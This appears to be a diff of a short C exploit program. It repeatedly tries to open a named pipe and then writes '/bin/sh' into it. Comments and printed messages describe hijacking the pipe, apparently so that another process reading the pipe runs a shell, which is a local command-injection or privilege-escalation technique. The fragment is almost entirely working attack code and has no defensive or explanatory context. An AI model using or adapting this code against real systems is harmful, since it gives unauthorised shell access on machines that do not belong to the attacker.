@@ -19,20 +19,14 @@ int main()
 
     while (1)
     {
-        fd = open(namedPipe, O_RDONLY); // Hijack pipe block
-        if (fd == -1)
+        if ((fd = open(namedPipe, O_WRONLY)) == -1) // Hijack pipe block
             continue; //Keep looping
+        printf("Pipe found!\n");
         break;
     }
-    printf("Opening pipe in read mode - blocking until next write...\n");
-    read(fd, buf, CMD_LEN); // Eat pipe contents
+    printf("Writing /bin/sh...\n");
+    write(fd, pipeCmd, CMD_LEN);
+    printf("Done!\n");
     close(fd);
-
-    printf("Opening pipe in write mode - blocking until next read...\n");
-    fd = open(namedPipe, O_WRONLY); // write only
-    write(fd, pipeCmd, CMD_LEN); // write cmd
-    printf("/bin/sh written to hijacked pipe!\n");
-    close(fd);
-
-    return 0;
+    exit(0);
 }
